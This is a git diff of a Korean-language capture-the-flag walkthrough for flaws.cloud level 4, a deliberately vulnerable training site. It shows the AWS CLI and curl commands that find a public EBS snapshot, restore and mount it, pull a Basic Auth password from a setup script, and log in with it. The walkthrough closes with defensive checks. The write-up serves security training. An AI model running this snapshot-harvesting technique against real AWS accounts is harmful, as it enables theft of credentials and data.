@@ -1,20 +1,26 @@
 # Level 4 — 공개 EBS 스냅샷
 
-> **URL**: http://level4-1156739cfb264ced6de514971a4bef68.flaws.cloud/
+> **설명 페이지**: http://level4-1156739cfb264ced6de514971a4bef68.flaws.cloud/
+> **실제 공격 타겟 (EC2 nginx)**: http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/
 > **핵심 기술**: EC2 EBS 스냅샷 / 볼륨 복원 / HTTP Basic Auth
 > **난이도**: ⭐⭐⭐
 > **본인 AWS 계정 필요**: ✅ (볼륨·EC2 생성)
 
 ## 🎯 목표
 
-이 레벨의 웹페이지는 **HTTP Basic Auth** 로 잠겨 있다. 그런데 힌트가 말한다: "**이 서버는 nginx 가 설정된 직후 EBS 스냅샷을 찍었다.**" 그 스냅샷은 실수로 **전 세계 공개** 되어 있다. 스냅샷을 복원하여 `.htpasswd` 를 꺼내고 Basic Auth 를 통과하는 것이 목표.
+레벨 4 는 **두 URL 로 구성**돼 있다:
+
+- `level4-...flaws.cloud/` — **문제 설명** S3 페이지 (누구나 접근 가능)
+- `4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/` — **실제 EC2 nginx 서버**, **HTTP Basic Auth 로 잠겨 있음**
+
+설명 페이지가 힌트를 준다: "**이 서버는 nginx 가 설정된 직후 EBS 스냅샷을 찍었다.**" 그 스냅샷은 실수로 **전 세계 공개** 되어 있다. 스냅샷을 복원하여 `.htpasswd` 를 꺼내고 Basic Auth 를 통과하는 것이 목표.
 
 ## 🧭 공식 힌트
 
 <details>
 <summary><b>Hint 1</b></summary>
 
-> 이 페이지는 간단한 Basic Auth 로 보호돼 있습니다. 그런데 **운영자는 설치 직후 EBS 스냅샷을 찍어 두는 습관**이 있었나 봅니다.
+> 이 페이지(EC2 nginx)는 간단한 Basic Auth 로 보호돼 있습니다. 그런데 **운영자는 설치 직후 EBS 스냅샷을 찍어 두는 습관**이 있었나 봅니다.
 
 </details>
 
@@ -41,13 +47,26 @@
 
 ## 🔍 정찰
 
-### 1. flaws 계정 ID 확인
+### 1. 설명 페이지 열기 — 실제 타겟 URL 확인
+```bash
+curl -s http://level4-1156739cfb264ced6de514971a4bef68.flaws.cloud/ | grep -Eo '[a-f0-9]{40}\.flaws\.cloud' | head -1
+# 4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud
+```
+
+### 2. 실제 타겟이 Basic Auth 걸려 있는지 확인
+```bash
+curl -sI http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/
+# HTTP/1.1 401 Unauthorized
+# WWW-Authenticate: Basic realm="Restricted Content"
+```
+
+### 3. flaws 계정 ID 확인
 ```bash
 aws sts get-caller-identity --profile flaws
 # "Account": "975426262029"
 ```
 
-### 2. 해당 계정이 보유한 공개 스냅샷 나열
+### 4. 해당 계정이 보유한 공개 스냅샷 나열
 ```bash
 aws ec2 describe-snapshots \
   --owner-ids 975426262029 \
@@ -59,11 +78,11 @@ aws ec2 describe-snapshots \
 {
   "SnapshotId": "snap-0b49342abd1bdcb89",
   "StartTime": "2017-02-28T01:35:12+00:00",
-  "Description": "Snapshot of flaws backup"
+  "Description": ""
 }
 ```
 
-### 3. 공개 여부 확인
+### 5. 공개 여부 확인
 ```bash
 aws ec2 describe-snapshot-attribute \
   --snapshot-id snap-0b49342abd1bdcb89 \
@@ -99,7 +118,7 @@ aws ec2 create-volume \
 
 ### 2. 같은 AZ 에 EC2 인스턴스(Amazon Linux 2023) 기동 후 attach
 ```bash
-# 내 EC2 인스턴스 아이디를 I 라고 하면
+# 내 EC2 인스턴스 아이디를 i-xxx 라고 하면
 aws ec2 attach-volume \
   --volume-id vol-0abcdef1234567890 \
   --instance-id i-0123456789abcdef0 \
@@ -124,12 +143,12 @@ sudo cat /mnt/flaws/home/ubuntu/setupNginx.sh
 htpasswd -b /etc/nginx/.htpasswd flaws nCP8xigdjpjyiXgJ7nJu7rw5Ro68iE8M
 ```
 
-### 4. Basic Auth 통과
+### 4. Basic Auth 통과 — **실제 타겟 URL 에** 로그인
 ```bash
 curl -u 'flaws:nCP8xigdjpjyiXgJ7nJu7rw5Ro68iE8M' \
-  http://level4-1156739cfb264ced6de514971a4bef68.flaws.cloud/
+  http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/ | head -30
 ```
-브라우저라면 `http://flaws:nCP8...@level4-....flaws.cloud/` 로 접속. 페이지에 다음 레벨 URL 이 적혀 있다.
+브라우저라면 `http://flaws:nCP8xigdjpjyiXgJ7nJu7rw5Ro68iE8M@4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/` 로 접속. 응답 본문에 다음 레벨 URL 이 적혀 있다.
 
 ### 5. 정리
 ```bash
@@ -198,8 +217,11 @@ aws ec2 enable-ebs-encryption-by-default --region us-west-2
 
 ## ✅ 체크리스트
 
+- [ ] 설명 페이지에서 실제 타겟 URL(`4d0cf09b...flaws.cloud`) 추출
+- [ ] 실제 타겟이 **401 Unauthorized** 를 돌려주는지 확인
 - [ ] 공개 스냅샷을 `describe-snapshots --owner-ids` 로 직접 찾음
 - [ ] 본인 계정에서 볼륨 복원 → 마운트 → `setupNginx.sh` 에서 자격증명 회수
+- [ ] `curl -u flaws:nCP8...` 로 실제 타겟 통과
 - [ ] 사용 후 볼륨·EC2 정리 (비용)
 - [ ] 본인 계정에 `ebs-snapshot-public-restorable-check` Config 규칙 추가
 
